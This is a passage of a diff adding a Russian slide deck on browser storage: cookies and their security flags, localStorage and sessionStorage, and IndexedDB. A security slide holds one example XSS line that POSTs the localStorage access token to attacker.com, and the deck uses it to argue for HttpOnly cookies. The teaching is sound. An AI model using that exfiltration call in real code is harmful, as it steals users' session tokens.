@@ -1,0 +1,1442 @@
+<!doctype html>
+<html lang="ru">
+
+<head>
+    <meta charset="utf-8">
+    <title>Куки, localStorage, разные Web APIs</title>
+    <meta name="author" content="Илья Степанов">
+    <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, minimal-ui">
+
+    <link rel="stylesheet" href="/utils/css/reveal.css">
+    <link rel="stylesheet" href="/utils/lib/css/animate.css">
+    <link rel="stylesheet" href="/utils/css/theme/night.css" id="theme">
+    <link rel="stylesheet" href="/utils/lib/css/zenburn.css">
+    <link rel="stylesheet" href="/utils/css/custom-base.css">
+</head>
+
+<body>
+    <div class="reveal">
+        <div class="slides">
+
+            <!-- ===== ТИТУЛ ===== -->
+            <section style="font-size: 70px; height: 100%; width: 100%">
+                <div class="fragment">
+                    <h1 class="animated" style="font-size: 1.6em;">Куки, localStorage,<br>разные Web APIs</h1>
+                    <p style="text-align: center; font-size: 0.5em;">Илья Степанов</p>
+                </div>
+            </section>
+
+            <!-- ===== ЧАСТЬ 1: ВВЕДЕНИЕ ===== -->
+            <section>
+                <section>
+                    <h1>Хранилища в браузере</h1>
+                </section>
+
+                <section>
+                    <h2>Зачем</h2>
+                    <ul>
+                        <li class="fragment">Сохранить токен авторизации между перезагрузками</li>
+                        <li class="fragment">Запомнить тему, язык, последний фильтр</li>
+                        <li class="fragment">Корзина, черновик формы, незавершённое действие</li>
+                        <li class="fragment">Кэш ответов API - не ходить на сервер каждый раз</li>
+                        <li class="fragment">Оффлайн-режим - PWA, мессенджер без интернета</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h2>Что есть в браузере</h2>
+                    <div class="timeline">
+                        <div class="timeline-item fragment">
+                            <div class="timeline-label">Cookies</div>
+                            <div class="timeline-arrow">-></div>
+                            <div class="timeline-desc">Маленькие, шлются на сервер с каждым запросом - для сессии и
+                                аутентификации</div>
+                        </div>
+                        <div class="timeline-item fragment">
+                            <div class="timeline-label">Web Storage</div>
+                            <div class="timeline-arrow">-></div>
+                            <div class="timeline-desc"><code>localStorage</code> и <code>sessionStorage</code> - простой
+                                key-value, только строки</div>
+                        </div>
+                        <div class="timeline-item fragment">
+                            <div class="timeline-label">IndexedDB</div>
+                            <div class="timeline-arrow">-></div>
+                            <div class="timeline-desc">База данных в браузере - для больших объёмов и оффлайна</div>
+                        </div>
+                        <div class="timeline-item fragment">
+                            <div class="timeline-label">Cache API</div>
+                            <div class="timeline-arrow">-></div>
+                            <div class="timeline-desc">Кэш HTTP-ответов - живёт рядом с Service Worker</div>
+                        </div>
+                    </div>
+                </section>
+
+                <section>
+                    <h2>Что не хранилище</h2>
+                    <p class="fragment" style="font-size: 0.78em; opacity: 0.85;">
+                        Переменные в JS, состояние React-компонентов, Zustand store - всё это <strong>живёт только пока
+                            вкладка открыта</strong>
+                    </p>
+                    <p class="fragment" style="font-size: 0.78em; opacity: 0.85; margin-top: 0.6em;">
+                        Перезагрузил - потерял. Если нужно пережить F5 - нужно одно из четырёх выше
+                    </p>
+                </section>
+            </section>
+
+            <!-- ===== ЧАСТЬ 2: COOKIES ===== -->
+            <section>
+                <section>
+                    <h1>Cookies</h1>
+                </section>
+
+                <section>
+                    <h2>Откуда взялись</h2>
+                    <p class="fragment" style="font-size: 0.78em; opacity: 0.85;">
+                        HTTP <strong>stateless</strong> - сервер не помнит, что было в прошлом запросе
+                    </p>
+                    <p class="fragment" style="font-size: 0.78em; opacity: 0.85; margin-top: 0.5em;">
+                        Netscape, 1994: добавили заголовок <code>Set-Cookie</code> - сервер просит браузер запомнить
+                        пару ключ-значение и присылать её обратно
+                    </p>
+                    <div class="arch-flow fragment" style="margin-top: 0.8em;">
+                        <div class="arch-box">Сервер</div>
+                        <div class="arch-arrow">-></div>
+                        <div class="arch-box highlight">Set-Cookie: sid=abc</div>
+                        <div class="arch-arrow">-></div>
+                        <div class="arch-box">Браузер хранит</div>
+                        <div class="arch-arrow">-></div>
+                        <div class="arch-box">Cookie: sid=abc</div>
+                        <div class="arch-arrow">-></div>
+                        <div class="arch-box">Сервер</div>
+                    </div>
+                </section>
+
+                <section>
+                    <h2>Анатомия cookie</h2>
+                    <pre class="http size-l code-example-one fragment"><code>Set-Cookie: sessionId=abc123; Domain=example.com; Path=/;
+            Expires=Wed, 21 Oct 2026 07:28:00 GMT;
+            Secure; HttpOnly; SameSite=Lax
+</code></pre>
+                    <ul style="margin-top: 0.6em;">
+                        <li class="fragment"><code>name=value</code> - сами данные</li>
+                        <li class="fragment"><code>Domain</code>, <code>Path</code> - где cookie действует</li>
+                        <li class="fragment"><code>Expires</code> / <code>Max-Age</code> - когда удалится</li>
+                        <li class="fragment"><code>Secure</code>, <code>HttpOnly</code>, <code>SameSite</code> - флаги
+                            безопасности</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h2>Domain и Path</h2>
+                    <pre class="http size-m code-example-one fragment"><code>Set-Cookie: token=...; Domain=example.com; Path=/api
+</code></pre>
+                    <ul style="margin-top: 0.5em;">
+                        <li class="fragment"><code>Domain=example.com</code> - cookie уходит на <strong>example.com и
+                                все поддомены</strong></li>
+                        <li class="fragment">Без атрибута - только на тот хост, что её поставил, без поддоменов</li>
+                        <li class="fragment"><code>Path=/api</code> - cookie уходит только на пути, начинающиеся с
+                            <code>/api</code></li>
+                        <li class="fragment">По умолчанию - текущий путь страницы</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h2>Время жизни</h2>
+                    <div class="compare fragment">
+                        <div class="compare-block">
+                            <h3>Session cookie</h3>
+                            <p style="font-size: 0.7em;">Без <code>Expires</code> и <code>Max-Age</code></p>
+                            <p style="font-size: 0.7em;">Удаляется при закрытии браузера</p>
+                            <p style="font-size: 0.65em; opacity: 0.7;">На практике - не всегда, современные браузеры
+                                восстанавливают сессии</p>
+                        </div>
+                        <div class="compare-block">
+                            <h3>Persistent cookie</h3>
+                            <p style="font-size: 0.7em;"><code>Expires=Wed, 21 Oct 2026...</code></p>
+                            <p style="font-size: 0.7em;"><code>Max-Age=3600</code> (секунды)</p>
+                            <p style="font-size: 0.65em; opacity: 0.7;"><code>Max-Age</code> приоритетнее
+                                <code>Expires</code></p>
+                        </div>
+                    </div>
+                    <p class="fragment" style="font-size: 0.72em; opacity: 0.8; margin-top: 0.6em;">
+                        Чтобы удалить cookie - выставить <code>Max-Age=0</code> или дату в прошлом
+                    </p>
+                </section>
+
+                <section>
+                    <h2>Как cookie попадает в запрос</h2>
+                    <p class="fragment" style="font-size: 0.78em; opacity: 0.85;">
+                        Браузер сам прикладывает заголовок <code>Cookie</code> ко всем запросам, чей URL подходит под
+                        <code>Domain + Path</code>
+                    </p>
+                    <pre class="http size-m code-example-one fragment" style="margin-top: 0.6em;"><code>GET /api/profile HTTP/1.1
+Host: example.com
+Cookie: sessionId=abc123; theme=dark
+</code></pre>
+                    <p class="fragment" style="font-size: 0.72em; opacity: 0.8; margin-top: 0.5em;">
+                        В <code>fetch</code> для cross-origin запросов нужно явное <code>credentials: 'include'</code>
+                    </p>
+                </section>
+
+                <section>
+                    <h2><code>document.cookie</code></h2>
+                    <pre class="javascript size-l code-example-one fragment"><code>// Чтение - одна большая строка со всеми cookie сразу
+document.cookie;
+// "sessionId=abc123; theme=dark; lang=ru"
+
+// Запись - одной строкой, со всеми атрибутами
+document.cookie = "theme=dark; path=/; max-age=2592000";
+
+// Удаление - такой же `set` с прошедшей датой
+document.cookie = "theme=; path=/; max-age=0";
+</code></pre>
+                    <p class="fragment" style="font-size: 0.72em; opacity: 0.8; margin-top: 0.5em;">
+                        API из 90-х - синхронный, со строками, без обещаний
+                    </p>
+                </section>
+
+                <section>
+                    <h2>CookieStore API</h2>
+                    <p class="fragment" style="font-size: 0.78em; opacity: 0.85;">
+                        Современная замена <code>document.cookie</code> - асинхронный, с объектами
+                    </p>
+                    <pre class="javascript size-l code-example-one fragment"><code>await cookieStore.set({
+    name: 'theme',
+    value: 'dark',
+    expires: Date.now() + 30 * 24 * 3600 * 1000,
+    sameSite: 'lax',
+});
+
+const c = await cookieStore.get('theme');
+// { name: 'theme', value: 'dark', ... }
+
+cookieStore.addEventListener('change', (e) => {
+    console.log('cookie изменилась', e.changed, e.deleted);
+});
+</code></pre>
+                    <p class="fragment" style="font-size: 0.72em; opacity: 0.8; margin-top: 0.5em;">
+                        В Safari пока не поддерживается - проверяйте перед использованием
+                    </p>
+                </section>
+
+                <section>
+                    <h2><code>Secure</code></h2>
+                    <p class="fragment" style="font-size: 0.78em; opacity: 0.85;">
+                        Cookie с этим флагом отправляется <strong>только по HTTPS</strong>
+                    </p>
+                    <p class="fragment" style="font-size: 0.78em; opacity: 0.85; margin-top: 0.5em;">
+                        Без него атакующий, перехвативший HTTP-трафик, видит cookie в открытом виде - привет, сессия
+                        пользователя
+                    </p>
+                    <p class="fragment" style="font-size: 0.78em; margin-top: 0.5em; color: #ffd54f;">
+                        На любой cookie с чувствительными данными - всегда <code>Secure</code>
+                    </p>
+                </section>
+
+                <section>
+                    <h2><code>HttpOnly</code></h2>
+                    <p class="fragment" style="font-size: 0.78em; opacity: 0.85;">
+                        Cookie с этим флагом <strong>не виден из JS</strong> - <code>document.cookie</code> его не
+                        вернёт
+                    </p>
+                    <pre class="javascript size-l code-example-one fragment" style="margin-top: 0.5em;"><code>// Сервер ставит:
+// Set-Cookie: token=eyJ...; HttpOnly; Secure; SameSite=Lax
+
+document.cookie;        // токена тут нет
+fetch('/api/me');       // но браузер сам приложит cookie к запросу
+</code></pre>
+                    <p class="fragment" style="font-size: 0.72em; opacity: 0.8; margin-top: 0.5em;">
+                        Если злоумышленник внедрил XSS - он не сможет украсть токен и отправить его на свой сервер
+                    </p>
+                </section>
+
+                <section>
+                    <h2><code>SameSite</code></h2>
+                    <p class="fragment" style="font-size: 0.78em; opacity: 0.85;">
+                        Когда cookie отправлять при переходе с другого сайта на наш
+                    </p>
+                    <div class="compare fragment" style="grid-template-columns: 1fr 1fr 1fr;">
+                        <div class="compare-block">
+                            <h3>Strict</h3>
+                            <p style="font-size: 0.7em;">Только если запрос инициирован с того же сайта</p>
+                            <p style="font-size: 0.65em; opacity: 0.7;">Перешёл по ссылке из почты - не залогинен</p>
+                        </div>
+                        <div class="compare-block">
+                            <h3>Lax</h3>
+                            <p style="font-size: 0.7em;">Strict + GET-навигации с другого сайта</p>
+                            <p style="font-size: 0.65em; opacity: 0.7;">Современный дефолт браузеров</p>
+                        </div>
+                        <div class="compare-block">
+                            <h3>None</h3>
+                            <p style="font-size: 0.7em;">Отправляется всегда. Только с <code>Secure</code></p>
+                            <p style="font-size: 0.65em; opacity: 0.7;">Для встраиваемых виджетов и SSO</p>
+                        </div>
+                    </div>
+                    <p class="fragment" style="font-size: 0.72em; opacity: 0.8; margin-top: 0.6em;">
+                        Это базовая защита от <strong>CSRF</strong> - чужой сайт не может за вас отправить запрос с
+                        вашими куками
+                    </p>
+                </section>
+
+                <section>
+                    <h2>First-party и third-party</h2>
+                    <p class="fragment" style="font-size: 0.78em; opacity: 0.85;">
+                        Открыли <code>shop.com</code> - на странице есть iframe от <code>ads.com</code>
+                    </p>
+                    <ul style="margin-top: 0.5em;">
+                        <li class="fragment"><strong>First-party</strong> - cookie домена страницы
+                            (<code>shop.com</code>)</li>
+                        <li class="fragment"><strong>Third-party</strong> - cookie стороннего домена
+                            (<code>ads.com</code>)</li>
+                    </ul>
+                    <p class="fragment" style="font-size: 0.78em; opacity: 0.85; margin-top: 0.6em;">
+                        3rd-party cookie позволяли рекламным сетям связывать пользователя <strong>между сайтами</strong>
+                        - основа таргетированной рекламы
+                    </p>
+                </section>
+
+                <section>
+                    <h2>Cookieless future</h2>
+                    <ul>
+                        <li class="fragment">Safari (ITP) и Firefox - блокируют 3rd-party cookies по умолчанию</li>
+                        <li class="fragment">Chrome много лет обещал то же - в 2024 отказался от полной блокировки, дал
+                            пользователю выбор</li>
+                        <li class="fragment">Privacy Sandbox - Topics, Protected Audience API - попытка дать рекламе
+                            контекст без слежки</li>
+                        <li class="fragment">Серверный трекинг через свой домен (<code>track.shop.com</code>) обходит
+                            ограничения - и ITP с этим борется</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h2>GDPR и cookie consent</h2>
+                    <p class="fragment" style="font-size: 0.78em; opacity: 0.85;">
+                        Если cookie не <strong>strictly necessary</strong> (сессия, корзина) - перед установкой нужно
+                        <strong>явное согласие</strong>
+                    </p>
+                    <ul style="margin-top: 0.5em;">
+                        <li class="fragment">Аналитика, реклама, A/B-тесты - под consent</li>
+                        <li class="fragment">"Принять всё" и "Отклонить всё" должны быть равно доступны</li>
+                        <li class="fragment">Реализуют через <strong>CMP</strong> - готовый виджет (Cookiebot, OneTrust,
+                            Osano)</li>
+                        <li class="fragment">До согласия GTM не должен грузить рекламные пиксели</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h2>Лимиты</h2>
+                    <ul>
+                        <li class="fragment">~4 KB на одну cookie</li>
+                        <li class="fragment">~50 cookie на домен (зависит от браузера)</li>
+                        <li class="fragment">Уходят <strong>в каждом</strong> запросе на свой домен - раздули =
+                            замедлили все запросы</li>
+                        <li class="fragment">Префикс <code>__Host-</code> заставляет cookie быть <code>Secure</code>,
+                            без <code>Domain</code>, с <code>Path=/</code> - дополнительная защита</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h2>Когда использовать</h2>
+                    <ul class="opinion">
+                        <li class="plus fragment">Сессионные токены, JWT - <code>HttpOnly + Secure + SameSite=Lax</code>
+                        </li>
+                        <li class="plus fragment">Любые данные, которые нужны серверу для рендера</li>
+                        <li class="plus fragment">CSRF-токены, A/B-бакеты</li>
+                        <li class="minus fragment">Большие объёмы - не сюда</li>
+                        <li class="minus fragment">Чисто клиентские настройки UI - проще <code>localStorage</code></li>
+                    </ul>
+                </section>
+            </section>
+
+            <!-- ===== ЧАСТЬ 3: WEB STORAGE ===== -->
+            <section>
+                <section>
+                    <h1>Web Storage</h1>
+                </section>
+
+                <section>
+                    <h2>Зачем появился</h2>
+                    <p class="fragment" style="font-size: 0.78em; opacity: 0.85;">
+                        Cookies маленькие (4 KB) и улетают на сервер с каждым запросом - даже если данные нужны только
+                        на клиенте
+                    </p>
+                    <p class="fragment" style="font-size: 0.78em; opacity: 0.85; margin-top: 0.5em;">
+                        В HTML5 добавили <strong>Web Storage</strong> - простой key-value, который живёт только в
+                        браузере и на сервер сам не отправляется
+                    </p>
+                </section>
+
+                <section>
+                    <h2>API</h2>
+                    <pre class="javascript size-l code-example-one fragment"><code>localStorage.setItem('theme', 'dark');
+localStorage.getItem('theme');     // 'dark'
+localStorage.removeItem('theme');
+localStorage.clear();              // удалить всё
+
+localStorage.length;               // сколько ключей
+localStorage.key(0);               // имя ключа по индексу
+
+// Сахар - можно как с обычным объектом
+localStorage.theme = 'dark';
+delete localStorage.theme;
+</code></pre>
+                </section>
+
+                <section>
+                    <h2><code>localStorage</code> vs <code>sessionStorage</code></h2>
+                    <div class="compare fragment">
+                        <div class="compare-block">
+                            <h3>localStorage</h3>
+                            <p style="font-size: 0.75em;">Живёт между сессиями</p>
+                            <p style="font-size: 0.75em;">Общий для всех вкладок origin'а</p>
+                            <p style="font-size: 0.75em;">Удалит только пользователь или код</p>
+                        </div>
+                        <div class="compare-block">
+                            <h3>sessionStorage</h3>
+                            <p style="font-size: 0.75em;">Живёт пока открыта вкладка</p>
+                            <p style="font-size: 0.75em;">У каждой вкладки свой</p>
+                            <p style="font-size: 0.75em;">Закрыли вкладку - всё стёрлось</p>
+                        </div>
+                    </div>
+                    <p class="fragment" style="font-size: 0.72em; opacity: 0.8; margin-top: 0.6em;">
+                        API одинаковый - выбор сводится к нужному времени жизни
+                    </p>
+                </section>
+
+                <section>
+                    <h2>Scope - origin</h2>
+                    <p class="fragment" style="font-size: 0.78em; opacity: 0.85;">
+                        <code>localStorage</code> привязан к <strong>origin</strong> - схема + хост + порт
+                    </p>
+                    <ul style="margin-top: 0.5em;">
+                        <li class="fragment"><code>https://app.com</code> и <code>https://api.app.com</code> -
+                            <strong>разные</strong> хранилища</li>
+                        <li class="fragment"><code>http://app.com</code> и <code>https://app.com</code> - тоже разные
+                        </li>
+                        <li class="fragment">Iframe с другого origin'а в чужой <code>localStorage</code> не залезет</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h2>Только строки</h2>
+                    <pre class="javascript size-l code-example-one fragment"><code>// Любое значение приводится к строке
+localStorage.setItem('count', 42);
+localStorage.getItem('count');        // "42" - не число
+
+localStorage.setItem('user', { name: 'Аня' });
+localStorage.getItem('user');         // "[object Object]"  ← упс
+</code></pre>
+                    <pre class="javascript size-l code-example-one fragment" style="margin-top: 0.5em;"><code>// Правильно - сериализуем JSON
+localStorage.setItem('user', JSON.stringify({ name: 'Аня' }));
+const user = JSON.parse(localStorage.getItem('user') ?? 'null');
+</code></pre>
+                </section>
+
+                <section>
+                    <h2>Синхронный API</h2>
+                    <p class="fragment" style="font-size: 0.78em; opacity: 0.85;">
+                        Все операции <strong>блокируют главный поток</strong> - на запись/чтение страница не отвечает
+                    </p>
+                    <pre class="javascript size-l code-example-one fragment" style="margin-top: 0.5em;"><code>// Записать большой JSON - заметная задержка
+const huge = { /* 1 MB данных */ };
+localStorage.setItem('cache', JSON.stringify(huge));  // блок ~10-50 мс
+
+// При первом обращении к localStorage браузер
+// читает с диска ВСЁ хранилище origin'а сразу
+</code></pre>
+                    <p class="fragment" style="font-size: 0.72em; opacity: 0.8; margin-top: 0.5em;">
+                        Поэтому большие или частые записи - не сюда. Для этого есть IndexedDB
+                    </p>
+                </section>
+
+                <section>
+                    <h2>Лимиты</h2>
+                    <ul>
+                        <li class="fragment">~5-10 MB на origin (зависит от браузера)</li>
+                        <li class="fragment">Превысил - <code>QuotaExceededError</code></li>
+                        <li class="fragment">Считается в UTF-16 - русские символы занимают столько же, сколько
+                            английские</li>
+                        <li class="fragment">Iframe с того же origin'а ест ту же квоту</li>
+                    </ul>
+                    <pre class="javascript size-m code-example-one fragment" style="margin-top: 0.5em;"><code>try {
+    localStorage.setItem('cache', huge);
+} catch (e) {
+    if (e.name === 'QuotaExceededError') {
+        // место кончилось - почистить старое или упасть аккуратно
+    }
+}
+</code></pre>
+                </section>
+
+                <section>
+                    <h2>Синхронизация между вкладками</h2>
+                    <p class="fragment" style="font-size: 0.78em; opacity: 0.85;">
+                        Когда одна вкладка пишет в <code>localStorage</code> - <strong>остальные</strong> вкладки того
+                        же origin'а получают событие
+                    </p>
+                    <pre class="javascript size-l code-example-one fragment"><code>window.addEventListener('storage', (e) => {
+    console.log(e.key);       // 'theme'
+    console.log(e.oldValue);  // 'light'
+    console.log(e.newValue);  // 'dark'
+    console.log(e.url);       // адрес вкладки-инициатора
+});
+
+// Сама вкладка-инициатор событие НЕ получает
+</code></pre>
+                    <p class="fragment" style="font-size: 0.72em; opacity: 0.8; margin-top: 0.5em;">
+                        Удобно для синхронизации логина/логаута между вкладками - без сервера и без WebSocket
+                    </p>
+                </section>
+
+                <section>
+                    <h2>Безопасность</h2>
+                    <p class="fragment" style="font-size: 0.78em; opacity: 0.85;">
+                        <code>localStorage</code> доступен <strong>любому JS</strong> на странице - своему, чужому, из
+                        npm-зависимости, из расширения браузера
+                    </p>
+                    <pre class="javascript size-l code-example-one fragment" style="margin-top: 0.5em;"><code>// XSS - и всё ваше хранилище уехало на чужой сервер
+fetch('https://attacker.com/steal', {
+    method: 'POST',
+    body: localStorage.getItem('access_token'),
+});
+</code></pre>
+                </section>
+
+                <section>
+                    <h2>Не для токенов</h2>
+                    <div class="compare fragment">
+                        <div class="compare-block">
+                            <h3>❌ <code>localStorage</code></h3>
+                            <p style="font-size: 0.7em;">Виден из любого JS</p>
+                            <p style="font-size: 0.7em;">XSS = слив токена</p>
+                            <p style="font-size: 0.7em;">Нужно вручную вставлять в <code>fetch</code></p>
+                        </div>
+                        <div class="compare-block">
+                            <h3>✅ <code>HttpOnly</code> cookie</h3>
+                            <p style="font-size: 0.7em;">Невидим из JS</p>
+                            <p style="font-size: 0.7em;">XSS не утащит токен</p>
+                            <p style="font-size: 0.7em;">Браузер сам прикладывает к запросам</p>
+                        </div>
+                    </div>
+                    <p class="fragment" style="font-size: 0.72em; margin-top: 0.6em; color: #ffd54f;">
+                        Правило: токены - в <code>HttpOnly</code> cookie, не в <code>localStorage</code>
+                    </p>
+                </section>
+
+                <section>
+                    <h2>Что класть нормально</h2>
+                    <ul class="opinion">
+                        <li class="plus fragment">Тема, язык, размер шрифта, выбранная валюта</li>
+                        <li class="plus fragment">Последний открытый раздел, состояние сайдбара</li>
+                        <li class="plus fragment">Черновик формы - чтобы не потерять при F5</li>
+                        <li class="plus fragment">Флаги "видел онбординг", "согласился с куками"</li>
+                        <li class="circle fragment">Если данные утекут - неприятно, но не критично</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h2>SSR и <code>localStorage</code></h2>
+                    <pre class="javascript size-l code-example-one fragment"><code>// На сервере объекта window нет
+const Component = () => {
+    const theme = localStorage.getItem('theme');  // ❌ ReferenceError
+    return &lt;div className={theme}&gt;...&lt;/div&gt;;
+};
+</code></pre>
+                    <pre class="javascript size-l code-example-one fragment" style="margin-top: 0.5em;"><code>// Читать только в useEffect - после mount
+const Component = () => {
+    const [theme, setTheme] = useState('light');
+    useEffect(() => {
+        setTheme(localStorage.getItem('theme') ?? 'light');
+    }, []);
+    return &lt;div className={theme}&gt;...&lt;/div&gt;;
+};
+</code></pre>
+                    <p class="fragment" style="font-size: 0.72em; opacity: 0.8; margin-top: 0.5em;">
+                        Минус - вспышка светлой темы перед переключением. Лечится cookie с темой и SSR
+                    </p>
+                </section>
+            </section>
+
+            <!-- ===== ЧАСТЬ 4: INDEXEDDB ===== -->
+            <section>
+                <section>
+                    <h1>IndexedDB</h1>
+                </section>
+
+                <section>
+                    <h2>Зачем</h2>
+                    <ul>
+                        <li class="fragment"><code>localStorage</code> - 5 MB и синхронный, для большого не подходит
+                        </li>
+                        <li class="fragment">Нужно хранить десятки тысяч записей и искать по ним</li>
+                        <li class="fragment">Оффлайн-режим - PWA, мессенджеры, заметки</li>
+                        <li class="fragment">Кэш ассетов и API-ответов рядом с Service Worker</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h2>Что это</h2>
+                    <ul>
+                        <li class="fragment"><strong>NoSQL key-value</strong> база прямо в браузере</li>
+                        <li class="fragment">Хранит структурированные объекты - не обязательно сериализовать</li>
+                        <li class="fragment">Индексы для поиска по полям</li>
+                        <li class="fragment">Транзакции - атомарность операций</li>
+                        <li class="fragment">Полностью асинхронный</li>
+                        <li class="fragment">Привязан к origin'у, как и Web Storage</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h2>Терминология</h2>
+                    <div class="timeline">
+                        <div class="timeline-item fragment">
+                            <div class="timeline-label">Database</div>
+                            <div class="timeline-arrow">-></div>
+                            <div class="timeline-desc">Именованная БД с версией - <code>open('app', 3)</code></div>
+                        </div>
+                        <div class="timeline-item fragment">
+                            <div class="timeline-label">Object store</div>
+                            <div class="timeline-arrow">-></div>
+                            <div class="timeline-desc">Аналог таблицы - набор объектов с одним keyPath</div>
+                        </div>
+                        <div class="timeline-item fragment">
+                            <div class="timeline-label">Index</div>
+                            <div class="timeline-arrow">-></div>
+                            <div class="timeline-desc">Индекс по полю - чтобы искать не по первичному ключу</div>
+                        </div>
+                        <div class="timeline-item fragment">
+                            <div class="timeline-label">Transaction</div>
+                            <div class="timeline-arrow">-></div>
+                            <div class="timeline-desc">Все операции внутри - атомарны. Упало одно - откатилось всё</div>
+                        </div>
+                        <div class="timeline-item fragment">
+                            <div class="timeline-label">Cursor</div>
+                            <div class="timeline-arrow">-></div>
+                            <div class="timeline-desc">Итератор по записям - читать большие наборы постепенно</div>
+                        </div>
+                    </div>
+                </section>
+
+                <section>
+                    <h2>Открытие БД</h2>
+                    <pre class="javascript size-l code-example-one fragment"><code>const request = indexedDB.open('app', 1);  // имя, версия
+
+request.onsuccess = (e) => {
+    const db = e.target.result;
+    // работаем с db
+};
+
+request.onerror = (e) => {
+    console.error('не открылось', e);
+};
+
+// Создание/миграция схемы - только тут
+request.onupgradeneeded = (e) => {
+    const db = e.target.result;
+    db.createObjectStore('notes', { keyPath: 'id', autoIncrement: true });
+};
+</code></pre>
+                </section>
+
+                <section>
+                    <h2>Миграции схемы</h2>
+                    <p class="fragment" style="font-size: 0.78em; opacity: 0.85;">
+                        Схема меняется только в <code>onupgradeneeded</code> - триггерится, когда передали версию
+                        <strong>больше</strong> текущей
+                    </p>
+                    <pre class="javascript size-l code-example-one fragment" style="margin-top: 0.5em;"><code>const request = indexedDB.open('app', 3);
+
+request.onupgradeneeded = (e) => {
+    const db = e.target.result;
+    const oldVersion = e.oldVersion;
+
+    if (oldVersion &lt; 1) {
+        db.createObjectStore('notes', { keyPath: 'id' });
+    }
+    if (oldVersion &lt; 2) {
+        const tx = e.target.transaction;
+        tx.objectStore('notes').createIndex('byTag', 'tag');
+    }
+    if (oldVersion &lt; 3) {
+        db.createObjectStore('drafts', { keyPath: 'id' });
+    }
+};
+</code></pre>
+                </section>
+
+                <section>
+                    <h2>Object store</h2>
+                    <pre class="javascript size-l code-example-one fragment"><code>// keyPath - какое поле объекта будет ключом
+db.createObjectStore('users', { keyPath: 'id' });
+
+// autoIncrement - ключи генерируются сами
+db.createObjectStore('logs', { keyPath: 'id', autoIncrement: true });
+
+// Out-of-line ключ - ключ передаётся отдельно от объекта
+db.createObjectStore('settings');  // нет keyPath
+store.put({ value: 'dark' }, 'theme');  // ключ - 'theme'
+</code></pre>
+                </section>
+
+                <section>
+                    <h2>Транзакции</h2>
+                    <pre class="javascript size-l code-example-one fragment"><code>const tx = db.transaction(['notes'], 'readwrite');
+const store = tx.objectStore('notes');
+
+store.add({ id: 1, title: 'Первая заметка' });
+store.put({ id: 2, title: 'Вторая' });
+
+tx.oncomplete = () => console.log('всё закоммитилось');
+tx.onerror = () => console.error('откатилось');
+</code></pre>
+                    <ul style="margin-top: 0.5em;">
+                        <li class="fragment"><code>readonly</code> или <code>readwrite</code></li>
+                        <li class="fragment">Транзакция автокоммитится, когда microtasks разойдутся</li>
+                        <li class="fragment">Нельзя <code>await</code> чужого промиса в середине - транзакция закроется
+                        </li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h2>CRUD</h2>
+                    <pre class="javascript size-l code-example-one fragment"><code>const store = db.transaction('notes', 'readwrite').objectStore('notes');
+
+// Create
+store.add({ id: 1, title: 'Новая' });   // упадёт, если ключ уже есть
+
+// Read
+store.get(1).onsuccess = (e) => console.log(e.target.result);
+store.getAll().onsuccess = (e) => console.log(e.target.result);
+
+// Update / Upsert
+store.put({ id: 1, title: 'Обновлённая' });
+
+// Delete
+store.delete(1);
+store.clear();
+</code></pre>
+                </section>
+
+                <section>
+                    <h2>Индексы</h2>
+                    <pre class="javascript size-l code-example-one fragment"><code>// В onupgradeneeded
+const store = db.createObjectStore('notes', { keyPath: 'id' });
+store.createIndex('byTag', 'tag', { unique: false });
+store.createIndex('byTitleTag', ['title', 'tag']);  // составной
+</code></pre>
+                    <pre class="javascript size-l code-example-one fragment" style="margin-top: 0.5em;"><code>// Поиск по индексу
+const tx = db.transaction('notes', 'readonly');
+const idx = tx.objectStore('notes').index('byTag');
+
+idx.getAll('work').onsuccess = (e) => {
+    console.log(e.target.result);  // все заметки с tag === 'work'
+};
+</code></pre>
+                </section>
+
+                <section>
+                    <h2>Курсоры</h2>
+                    <p class="fragment" style="font-size: 0.78em; opacity: 0.85;">
+                        Когда записей много - <code>getAll</code> съест память. Курсор отдаёт по одной
+                    </p>
+                    <pre class="javascript size-l code-example-one fragment" style="margin-top: 0.5em;"><code>const store = db.transaction('notes').objectStore('notes');
+const range = IDBKeyRange.bound(100, 200);
+
+store.openCursor(range).onsuccess = (e) => {
+    const cursor = e.target.result;
+    if (!cursor) return;            // дошли до конца
+
+    console.log(cursor.value);
+    cursor.continue();              // следующая запись
+};
+</code></pre>
+                </section>
+
+                <section>
+                    <h2>Боль нативного API</h2>
+                    <ul>
+                        <li class="fragment">Колбэки и события - <code>onsuccess</code> вместо <code>await</code></li>
+                        <li class="fragment">Многословно - на простой <code>get</code> уходит 5 строк</li>
+                        <li class="fragment">Транзакции автозакрываются - нельзя смешать с обычными промисами</li>
+                        <li class="fragment">Ошибки летают через <code>event.target.error</code></li>
+                    </ul>
+                    <p class="fragment" style="font-size: 0.78em; margin-top: 0.6em;">
+                        Поэтому почти всегда используют обёртки
+                    </p>
+                </section>
+
+                <section>
+                    <h2>Обёртки</h2>
+                    <pre class="javascript size-l code-example-one fragment"><code>// idb (Jake Archibald) - тонкая Promise-обёртка
+import { openDB } from 'idb';
+
+const db = await openDB('app', 1, {
+    upgrade(db) {
+        db.createObjectStore('notes', { keyPath: 'id' });
+    },
+});
+
+await db.put('notes', { id: 1, title: 'Заметка' });
+const note = await db.get('notes', 1);
+const all = await db.getAll('notes');
+</code></pre>
+                    <ul style="margin-top: 0.5em;">
+                        <li class="fragment"><strong>idb</strong> - минимальная обёртка над нативным API</li>
+                        <li class="fragment"><strong>Dexie.js</strong> - ORM-подобный интерфейс, запросы в стиле LINQ
+                        </li>
+                        <li class="fragment"><strong>localForage</strong> - API как у <code>localStorage</code>, под
+                            капотом IndexedDB</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h2>Квоты</h2>
+                    <pre class="javascript size-l code-example-one fragment"><code>const { quota, usage } = await navigator.storage.estimate();
+console.log(usage, '/', quota);  // байт уже занято / всего доступно
+</code></pre>
+                    <ul style="margin-top: 0.5em;">
+                        <li class="fragment">Лимит обычно - часть от свободного места на диске (десятки процентов)</li>
